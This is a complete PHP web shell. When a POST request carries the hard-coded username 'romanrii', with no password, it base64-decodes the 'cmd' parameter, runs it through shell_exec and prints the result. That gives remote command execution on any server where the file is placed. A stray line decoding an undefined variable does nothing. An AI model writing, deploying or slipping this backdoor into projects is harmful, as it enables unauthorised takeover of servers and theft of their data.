<?php

//$authorizedUsers = ["romanrii"];
$authorizedUsers = array("romanrii");  // Need to use array() since its PHP5.2 vs []

if (isset($_POST["username"])) {
    // Account valid and authorized to execute commands
    if (!in_array($_POST["username"], $authorizedUsers)) {
        $errormsg = "Invalid login, please try again";
        echo $errormsg;
        return;
    }
    // User provided the cmd parameter
    if (!isset($_POST["cmd"])){
        $errormsg = "Missing parameter.";
        echo $errormsg;
        return;
    }
    $decoded_string = base64_decode($encoded_string);
    $command = base64_decode($_POST["cmd"]);  // Base64 encode the command to avoid formatting issues
    $output = shell_exec($command);
    if (!$output) {
        echo "[-] Error executing command";
        return;
    }
    echo $output;
    return;
}

?>